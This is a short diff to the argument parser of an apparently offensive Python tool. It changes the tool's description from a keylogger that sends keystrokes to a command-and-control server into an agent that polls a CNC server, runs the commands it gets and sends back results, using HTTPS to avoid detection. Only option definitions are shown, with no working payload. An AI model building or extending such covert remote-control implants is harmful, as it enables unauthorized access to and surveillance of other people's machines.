@@ -13,15 +13,15 @@ DEFAULT_SERVER_PORT = 443
 
 def get_arguments():
     from argparse import ArgumentParser
-    parser = ArgumentParser(description="Captures keystrokes and sends them over the internet "
-                                        "to the command&control server. "
+    parser = ArgumentParser(description="Polls the CNC server, receives the commands from there, "
+                                        "executes them and sends back the results. "
                                         "The client and the server use HTTPS for avoiding detection.")
     parser.add_argument('--server-address',
                         dest='server_address',
                         required=True,
                         type=str,
                         help='Specify an IP address or a domain name of the server '
-                             'that receives the data stream from the keylogger')
+                             'that receives the data stream from the puppet')
     parser.add_argument('--server-port',
                         dest='server_port',
                         required=False,
